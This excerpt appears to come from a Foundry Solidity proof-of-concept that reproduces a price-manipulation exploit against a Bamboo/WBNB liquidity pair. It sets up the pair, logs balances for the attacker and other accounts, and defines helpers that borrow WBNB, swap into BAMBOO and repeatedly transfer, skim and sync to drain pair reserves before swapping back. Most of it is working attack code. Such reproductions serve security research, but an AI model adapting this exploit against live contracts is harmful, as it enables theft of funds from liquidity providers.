...
pair = new UniswapV2Pair(                        address(wbnb), address(bamboo),                         reserve0pair, reserve1pair,                         blockTimestampLastpair, kLastpair,                         price0CumulativeLastpair, price1CumulativeLastpair);
pairAddr = address(pair);
factory = new UniswapV2Factory( address(weth), address(pair), address(0x0), address(0x0) );
...
queryERC20BalanceDecimals(address(wbnb), address(wbnb), wbnb.decimals());
queryERC20BalanceDecimals(address(bamboo), address(wbnb), bamboo.decimals());
emit log_string("");
emit log_string("Bamboo Balances: ");
queryERC20BalanceDecimals(address(wbnb), address(bamboo), wbnb.decimals());
queryERC20BalanceDecimals(address(bamboo), address(bamboo), bamboo.decimals());
emit log_string("");
emit log_string("Weth Balances: ");
queryERC20BalanceDecimals(address(wbnb), address(weth), wbnb.decimals());
queryERC20BalanceDecimals(address(bamboo), address(weth), bamboo.decimals());
emit log_string("");
emit log_string("Pair Balances: ");
queryERC20BalanceDecimals(address(wbnb), address(pair), wbnb.decimals());
queryERC20BalanceDecimals(address(bamboo), address(pair), bamboo.decimals());
emit log_string("");
emit log_string("Attacker Balances: ");
queryERC20BalanceDecimals(address(wbnb), address(attacker), wbnb.decimals());
queryERC20BalanceDecimals(address(bamboo), address(attacker), bamboo.decimals());
emit log_string("");
emit log_string("");
emit log_string("");
}
...
function swap_pair_attacker_wbnb_bamboo(uint256 amount, uint256 amountOut) internal eurus{
wbnb.transfer(address(pair), amount);
pair.swap(0, amountOut, attacker, new bytes(0));
}
function swap_pair_attacker_bamboo_wbnb(uint256 amount, uint256 amountOut) internal eurus{
bamboo.transfer(address(pair), amount);
pair.swap(amountOut, 0, attacker, new bytes(0));
}
function burn_bamboo_pair(uint256 amount) internal eurus { bamboo.transfer(address(pair), amount); pair.skim(attacker); pair.sync(); bamboo.transfer(address(pair), amount); pair.skim(attacker); pair.sync(); }
function test_gt() public {
vm.startPrank(attacker);
vm.warp(blockTimestamp); vm.roll(29668034);
emit log_named_uint("amt0", 4000 ether);
borrow_wbnb_owner(4000 ether);
printBalance("After step0 ");
emit log_named_uint("amt1", 155890849999929463804);
emit log_named_uint("amt2", pair.getAmountOut(155890849999929463804, address(wbnb)));
swap_pair_attacker_wbnb_bamboo(155890849999929463804, pair.getAmountOut(155890849999929463804, address(wbnb)));
...
emit log_named_uint("amt5", pair.getAmountOut(bamboo.balanceOf(attacker), address(bamboo)));
swap_pair_attacker_bamboo_wbnb(bamboo.balanceOf(attacker), pair.getAmountOut(bamboo.balanceOf(attacker), address(bamboo)));
